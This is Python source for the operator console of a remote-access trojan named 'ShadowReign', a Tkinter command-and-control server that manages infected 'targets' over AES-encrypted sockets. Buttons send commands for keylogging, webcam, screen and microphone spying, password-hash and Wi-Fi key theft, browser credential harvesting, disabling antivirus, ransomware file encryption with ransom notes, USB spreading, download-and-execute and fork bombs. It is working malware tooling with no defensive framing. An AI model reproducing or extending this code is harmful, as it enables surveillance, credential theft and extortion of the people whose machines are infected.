import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import json
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image, ImageTk
import io
import time
import hashlib
import zlib
import pyaudio

class ShadowReignGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ShadowReign v2.0 - C2 Elite")
        self.root.geometry("1600x1000")
        self.root.configure(bg="#0A0F1A")
        self.root.attributes('-alpha', 0.95)
        self.HOST = "0.0.0.0"
        self.PORT = 5251
        self.KEY = hashlib.sha256(b"ShadowReignBoss!").digest()
        self.clients = {}
        self.clients_lock = threading.Lock()
        self.selected_client = None
        self.home_dir = os.path.expanduser("~")
        self.stream_window = None
        self.screenshot_window = None
        self.audio_window = None
        self.webcam_window = None
        self.audio_stream = None
        self.audio = pyaudio.PyAudio()
        self.setup_ui()
        self.start_server()
        self.root.mainloop()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background="#0A0F1A", borderwidth=0)
        style.configure("TNotebook.Tab", background="#1C2526", foreground="#00FFCC", padding=[25, 12], font=("Courier", 14, "bold"), borderwidth=2, bordercolor="#00FFCC")
        style.map("TNotebook.Tab", background=[("selected", "#2E3B4E")], foreground=[("selected", "#FFFFFF")])
        style.configure("Treeview", background="#1C2526", foreground="#FFFFFF", fieldbackground="#1C2526", font=("Courier", 12), rowheight=35)
        style.configure("Treeview.Heading", background="#0A0F1A", foreground="#00FFCC", font=("Courier", 13, "bold"))

        sidebar = tk.Frame(self.root, bg="#0A0F1A", width=400, relief="flat", borderwidth=2, highlightbackground="#00FFCC")
        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        tk.Label(sidebar, text="> TARGETS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 20, "bold")).pack(pady=(10, 5), padx=10, anchor="w")
        
        self.client_list = ttk.Treeview(sidebar, columns=("ID", "IP", "OS", "Status", "Anti-VM"), show="headings", height=20)
        self.client_list.heading("ID", text="ID")
        self.client_list.heading("IP", text="IP")
        self.client_list.heading("OS", text="OS")
        self.client_list.heading("Status", text="STATUS")
        self.client_list.heading("Anti-VM", text="ANTI-VM")
        self.client_list.column("ID", width=50, anchor="center")
        self.client_list.column("IP", width=150, anchor="center")
        self.client_list.column("OS", width=100, anchor="center")
        self.client_list.column("Status", width=80, anchor="center")
        self.client_list.column("Anti-VM", width=80, anchor="center")
        self.client_list.pack(fill=tk.Y, padx=10, pady=10)
        self.client_list.bind("<<TreeviewSelect>>", self.select_client)

        self.main_frame = tk.Frame(self.root, bg="#0A0F1A", relief="flat", borderwidth=2, highlightbackground="#00FFCC")
        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(self.main_frame, text="> SHADOWREIGN C2", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 24, "bold")).pack(pady=(5, 10), anchor="w")
        
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=5)

        tabs = {
            "Keys": self.create_keylogger_tab,
            "Files": self.create_files_tab,
            "Media": self.create_media_tab,
            "System": self.create_system_tab,
            "Chaos": self.create_pranks_tab,
            "Shell": self.create_shell_tab,
            "Live": self.create_live_tab,
            "Advanced": self.create_advanced_tab,
            "Remote": self.create_remote_tab,
            "Exploit": self.create_exploit_tab,
            "Network": self.create_network_tab,
            "Pranks": self.create_extra_pranks_tab
        }
        for name, func in tabs.items():
            tab = tk.Frame(self.notebook, bg="#0A0F1A")
            self.notebook.add(tab, text=name)
            func(tab)

    def create_button(self, parent, text, command):
        return tk.Button(parent, text=text, command=command, bg="#2E3B4E", fg="#00FFCC", font=("Courier", 12, "bold"), bd=2, relief="flat", highlightbackground="#00FFCC", highlightthickness=1, padx=20, pady=10, activebackground="#4A90E2", cursor="hand2")

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_GCM)
            ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
            iv = base64.b64encode(cipher.nonce).decode()
            ct = base64.b64encode(ct_bytes).decode()
            tag = base64.b64encode(tag).decode()
            return f"{iv}:{ct}:{tag}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct, tag = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            tag = base64.b64decode(tag)
            cipher = AES.new(self.KEY, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ct, tag).decode()
        except Exception:
            return None

    def send_message(self, sock, message):
        try:
            compressed = zlib.compress(message.encode())
            encrypted = self.encrypt(base64.b64encode(compressed).decode())
            length = len(encrypted)
            length_bytes = length.to_bytes(4, byteorder='big')
            sock.sendall(length_bytes)
            sock.sendall(encrypted.encode())
        except Exception:
            pass

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.server.settimeout(30)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(50)
        threading.Thread(target=self.accept_clients, daemon=True).start()

    def accept_clients(self):
        client_id = 0
        while True:
            try:
                client_socket, addr = self.server.accept()
                client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                client_socket.settimeout(15)
                ip = addr[0]
                with self.clients_lock:
                    existing_id = next((cid for cid, (sock, info) in self.clients.items() if info["ip"] == ip), None)
                    if existing_id is not None:
                        self.clients[existing_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Reconnecting", "anti_vm": False, "last_seen": time.time()})
                    else:
                        self.clients[client_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Online", "anti_vm": False, "last_seen": time.time()})
                        client_id += 1
                    threading.Thread(target=self.handle_client, args=(existing_id if existing_id is not None else client_id - 1,), daemon=True).start()
                self.queue_gui_update()
            except Exception:
                time.sleep(0.5)

    def handle_client(self, client_id):
        with self.clients_lock:
            sock = self.clients[client_id][0]
        last_heartbeat = time.time()
        while True:
            try:
                length_bytes = sock.recv(4)
                if not length_bytes:
                    if time.time() - last_heartbeat > 15:
                        with self.clients_lock:
                            self.clients[client_id][1]["status"] = "Offline"
                        self.queue_gui_update()
                    break
                length = int.from_bytes(length_bytes, byteorder='big')
                data = b""
                while len(data) < length:
                    chunk = sock.recv(min(1024, length - len(data)))
                    if not chunk:
                        raise Exception("Socket closed")
                    data += chunk
                response = json.loads(self.decrypt(data.decode()))
                with self.clients_lock:
                    self.clients[client_id][1].update(response)
                    self.clients[client_id][1]["last_seen"] = time.time()
                    if response.get("ping") == "heartbeat":
                        last_heartbeat = time.time()
                    else:
                        self.clients[client_id][1]["status"] = "Online"
                if response.get("ping") != "heartbeat":
                    self.process_response(client_id, response)
            except Exception:
                if time.time() - last_heartbeat > 15:
                    with self.clients_lock:
                        self.clients[client_id][1]["status"] = "Offline"
                    self.queue_gui_update()
                break

    def process_response(self, client_id, response):
        if client_id != self.selected_client:
            return
        if "keylogs" in response:
            self.update_text(self.keylog_display, response["keylogs"])
        elif "files" in response:
            self.update_text(self.file_display, "\n".join(response["files"]))
        elif "screenshot" in response:
            self.show_screenshot(response["screenshot"])
        elif "screen_rec" in response:
            self.save_to_file("screen_rec.avi", response["screen_rec"], binary=True)
        elif "webcam" in response:
            self.show_webcam(response["webcam"])
        elif "stream_frame" in response or "remote_frame" in response:
            self.update_stream(self.stream_label, response.get("stream_frame") or response["remote_frame"])
        elif "webcam_frame" in response:
            self.update_stream(self.webcam_label, response["webcam_frame"])
        elif "mic_frame" in response:
            self.play_audio(response["mic_frame"])
        elif "shell_output" in response:
            self.update_text(self.shell_output, response["shell_output"])
        elif "creds" in response:
            creds_text = "\n".join([f"{url}: {info['user']} - {info['pass']}" for url, info in response["creds"].items()])
            self.update_text(self.exploit_output, creds_text)
        elif "encrypted" in response:
            self.update_text(self.exploit_output, f"Encrypted: {response['encrypted']} | Key: {response['key']}")
        elif "sys_info" in response:
            self.update_text(self.system_output, "\n".join([f"{k}: {v}" for k, v in response["sys_info"].items()]))
        elif "wifi" in response:
            wifi_text = "\n".join([f"{ssid}: {key}" for ssid, key in response["wifi"].items()])
            self.update_text(self.system_output, wifi_text)
        elif "status" in response:
            self.update_text(self.system_output, response["status"])
        self.queue_gui_update()

    def queue_gui_update(self):
        self.root.after(0, self.update_client_list)

    def update_client_list(self):
        with self.clients_lock:
            current_clients = dict(self.clients)
        self.client_list.delete(*self.client_list.get_children())
        for cid, (sock, info) in current_clients.items():
            status_color = "#00FF00" if info["status"] == "Online" else "#FFFF00" if info["status"] == "Reconnecting" else "#FF0000"
            self.client_list.insert("", "end", values=(cid, info["ip"], info["os"], info["status"], "On" if info["anti_vm"] else "Off"), tags=(status_color,))
            self.client_list.tag_configure(status_color, foreground=status_color)

    def update_text(self, widget, text):
        widget.delete(1.0, tk.END)
        widget.insert(tk.END, text)

    def save_to_file(self, filename, data, binary=False):
        filepath = os.path.join(self.home_dir, f"ShadowReign_{filename}")
        mode = "wb" if binary else "w"
        content = base64.b64decode(data) if binary else data
        with open(filepath, mode) as f:
            f.write(content)

    def show_screenshot(self, b64_data):
        if not self.screenshot_window or not self.screenshot_window.winfo_exists():
            self.screenshot_window = tk.Toplevel(self.root)
            self.screenshot_window.title("> SCREENSHOT")
            self.screenshot_window.configure(bg="#0A0F1A")
            self.screenshot_window.attributes('-alpha', 0.95)
            self.screenshot_label = tk.Label(self.screenshot_window, bg="#1C2526")
            self.screenshot_label.pack(pady=10, padx=10)
        img_data = base64.b64decode(b64_data)
        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((800, 600))
        photo = ImageTk.PhotoImage(img)
        self.screenshot_label.configure(image=photo)
        self.screenshot_label.image = photo

    def show_webcam(self, b64_data):
        if not self.webcam_window or not self.webcam_window.winfo_exists():
            self.webcam_window = tk.Toplevel(self.root)
            self.webcam_window.title("> WEBCAM SNAP")
            self.webcam_window.configure(bg="#0A0F1A")
            self.webcam_window.attributes('-alpha', 0.95)
            self.webcam_label = tk.Label(self.webcam_window, bg="#1C2526")
            self.webcam_label.pack(pady=10, padx=10)
        img_data = base64.b64decode(b64_data)
        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((800, 600))
        photo = ImageTk.PhotoImage(img)
        self.webcam_label.configure(image=photo)
        self.webcam_label.image = photo

    def update_stream(self, label, b64_data):
        if label and label.winfo_exists():
            img_data = base64.b64decode(b64_data)
            img = Image.open(io.BytesIO(img_data))
            img.thumbnail((800, 600))
            photo = ImageTk.PhotoImage(img)
            label.configure(image=photo)
            label.image = photo

    def play_audio(self, b64_data):
        if not self.audio_window or not self.audio_window.winfo_exists():
            self.audio_window = tk.Toplevel(self.root)
            self.audio_window.title("> LIVE AUDIO")
            self.audio_window.configure(bg="#0A0F1A")
            self.audio_window.attributes('-alpha', 0.95)
            tk.Label(self.audio_window, text="Playing live audio...", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 14)).pack(pady=10)
            self.audio_stream = self.audio.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        audio_data = base64.b64decode(b64_data)
        self.audio_stream.write(audio_data)

    def select_client(self, event):
        selected = self.client_list.selection()
        if selected:
            self.selected_client = int(self.client_list.item(selected[0])["values"][0])
            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_stream = None
            if self.audio_window and self.audio_window.winfo_exists():
                self.audio_window.destroy()

    def send_command(self, command, data=None):
        if self.selected_client is None:
            messagebox.showerror("Error", "No active client selected!")
            return
        with self.clients_lock:
            sock = self.clients[self.selected_client][0]
            if self.clients[self.selected_client][1]["status"] in ["Online", "Reconnecting"]:
                self.send_message(sock, json.dumps({"command": command, "data": data}))

    def create_keylogger_tab(self, tab):
        tk.Label(tab, text="> KEYLOGS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "START", lambda: self.send_command("keylogger_start")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "STOP", lambda: self.send_command("keylogger_stop")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "DUMP", lambda: self.send_command("keylogger_dump")).pack(side=tk.LEFT, padx=5)
        self.keylog_display = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.keylog_display.pack(pady=15)

    def create_files_tab(self, tab):
        tk.Label(tab, text="> FILES", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "LIST", lambda: self.send_command("list_files", tk.simpledialog.askstring("Path", "Enter path:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "UPLOAD", self.upload_file).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "DOWNLOAD", self.download_file).pack(side=tk.LEFT, padx=5)
        self.file_display = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.file_display.pack(pady=15)

    def upload_file(self):
        filepath = filedialog.askopenfilename()
        if filepath:
            target_path = tk.simpledialog.askstring("Target Path", "Enter path on target:")
            if target_path:
                with open(filepath, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                self.send_command("receive_file", {"path": target_path, "content": content})

    def download_file(self):
        remote_path = tk.simpledialog.askstring("Remote Path", "Enter file path on target:")
        if remote_path:
            self.send_command("send_file", remote_path)

    def create_media_tab(self, tab):
        tk.Label(tab, text="> MEDIA", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "SCREENSHOT", lambda: self.send_command("screenshot")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "VIEW SCREEN", self.start_screen_stream).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "RECORD SCREEN", lambda: self.send_command("record_screen", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "WEBCAM SNAP", lambda: self.send_command("webcam_snap")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "RECORD A/V", lambda: self.send_command("record_av", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "STOP STREAM", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)

    def start_screen_stream(self):
        if not self.stream_window or not self.stream_window.winfo_exists():
            self.stream_window = tk.Toplevel(self.root)
            self.stream_window.title("> LIVE SCREEN")
            self.stream_window.configure(bg="#0A0F1A")
            self.stream_window.attributes('-alpha', 0.95)
            self.stream_label = tk.Label(self.stream_window, bg="#1C2526")
            self.stream_label.pack(pady=10, padx=10)
        self.send_command("stream_screen")

    def create_system_tab(self, tab):
        tk.Label(tab, text="> SYSTEM", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "DUMP HASHES", lambda: self.send_command("dump_hashes")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "STEAL WIFI", lambda: self.send_command("steal_wifi")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "ELEVATE", lambda: self.send_command("elevate_privileges")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "SYSTEM INFO", lambda: self.send_command("system_info")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "KILL PROCESS", lambda: self.send_command("kill_process", tk.simpledialog.askstring("PID", "Enter PID:"))).pack(side=tk.LEFT, padx=5)
        self.system_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.system_output.pack(pady=15)

    def create_pranks_tab(self, tab):
        tk.Label(tab, text="> CHAOS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "JUMPSCARE", lambda: self.send_command("jumpscare")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "CRASH", lambda: self.send_command("crash_system")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "FORK BOMB", lambda: self.send_command("fork_bomb")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "LOCK SCREEN", lambda: self.send_command("lock_screen")).pack(side=tk.LEFT, padx=5)

    def create_shell_tab(self, tab):
        tk.Label(tab, text="> LIVE SHELL", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        self.shell_input = tk.Entry(tab, width=60, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.shell_input.pack(pady=10)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "EXECUTE", lambda: self.send_command("live_shell_cmd", self.shell_input.get())).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "START SHELL", lambda: self.send_command("live_shell")).pack(side=tk.LEFT, padx=5)
        self.shell_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.shell_output.pack(pady=15)

    def create_live_tab(self, tab):
        tk.Label(tab, text="> LIVE STREAMS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "SCREEN", self.start_screen_stream).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "WEBCAM", self.start_webcam_stream).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "MIC", lambda: self.send_command("stream_mic")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)

    def start_webcam_stream(self):
        if not self.webcam_window or not self.webcam_window.winfo_exists():
            self.webcam_window = tk.Toplevel(self.root)
            self.webcam_window.title("> LIVE WEBCAM")
            self.webcam_window.configure(bg="#0A0F1A")
            self.webcam_window.attributes('-alpha', 0.95)
            self.webcam_label = tk.Label(self.webcam_window, bg="#1C2526")
            self.webcam_label.pack(pady=10, padx=10)
        self.send_command("stream_webcam")

    def create_advanced_tab(self, tab):
        tk.Label(tab, text="> ADVANCED", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "INJECT", lambda: self.send_command("inject", tk.simpledialog.askstring("Process", "Enter process name:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "SELF-DESTRUCT", lambda: self.send_command("self_destruct")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "TOGGLE ANTI-VM", lambda: self.send_command("toggle_anti_vm", not self.clients[self.selected_client][1]["anti_vm"])).pack(side=tk.LEFT, padx=5)

    def create_remote_tab(self, tab):
        tk.Label(tab, text="> REMOTE DESKTOP", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "START", lambda: self.send_command("remote_desktop", {"action": "start"})).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream")).pack(side=tk.LEFT, padx=5)
        
        control_frame = tk.Frame(tab, bg="#0A0F1A")
        control_frame.pack(pady=10)
        tk.Label(control_frame, text="X:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_x = tk.Entry(control_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_x.pack(side=tk.LEFT, padx=5)
        tk.Label(control_frame, text="Y:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_y = tk.Entry(control_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_y.pack(side=tk.LEFT, padx=5)
        self.create_button(control_frame, "MOVE", self.move_mouse).pack(side=tk.LEFT, padx=5)
        self.create_button(control_frame, "CLICK", lambda: self.move_mouse(click=True)).pack(side=tk.LEFT, padx=5)
        
        key_frame = tk.Frame(tab, bg="#0A0F1A")
        key_frame.pack(pady=10)
        tk.Label(key_frame, text="KEY:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_key = tk.Entry(key_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_key.pack(side=tk.LEFT, padx=5)
        self.create_button(key_frame, "PRESS", self.press_key).pack(side=tk.LEFT, padx=5)

    def move_mouse(self, click=False):
        try:
            x = int(self.remote_x.get())
            y = int(self.remote_y.get())
            self.send_command("remote_desktop", {"action": "mouse", "x": x, "y": y, "click": click})
        except ValueError:
            messagebox.showerror("Error", "Invalid coordinates")

    def press_key(self):
        key = self.remote_key.get()
        if key:
            self.send_command("remote_desktop", {"action": "key", "key": key})

    def create_exploit_tab(self, tab):
        tk.Label(tab, text="> EXPLOITS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "ENCRYPT FILES", lambda: self.send_command("encrypt_files")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "EXFIL BROWSER", lambda: self.send_command("exfil_browser")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "DISABLE AV", lambda: self.send_command("disable_av")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "HARVEST CREDS", lambda: self.send_command("harvest_creds")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "RANSOM NOTE", lambda: self.send_command("ransom_note", {"message": tk.simpledialog.askstring("Note", "Enter ransom message:")})).pack(side=tk.LEFT, padx=5)
        self.exploit_output = tk.Text(tab, height=15, width=100, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.exploit_output.pack(pady=15)

    def create_network_tab(self, tab):
        tk.Label(tab, text="> NETWORK", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "SPREAD USB", lambda: self.send_command("spread_usb")).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "DOWNLOAD & EXEC", lambda: self.send_command("download_execute", {"url": tk.simpledialog.askstring("URL", "Enter URL:")})).pack(side=tk.LEFT, padx=5)

    def create_extra_pranks_tab(self, tab):
        tk.Label(tab, text="> EXTRA PRANKS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "FAKE ALERT", lambda: self.send_command("fake_alert", {"message": tk.simpledialog.askstring("Message", "Enter alert text:")})).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "DISABLE INPUT", lambda: self.send_command("disable_input", tk.simpledialog.askinteger("Duration", "Seconds:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "OPEN URL", lambda: self.send_command("open_url", tk.simpledialog.askstring("URL", "Enter URL:"))).pack(side=tk.LEFT, padx=5)
        self.create_button(btn_frame, "PLAY SOUND", lambda: self.send_command("play_sound", tk.simpledialog.askstring("Text", "Enter text to speak:"))).pack(side=tk.LEFT, padx=5)

if __name__ == "__main__":
    ShadowReignGUI()
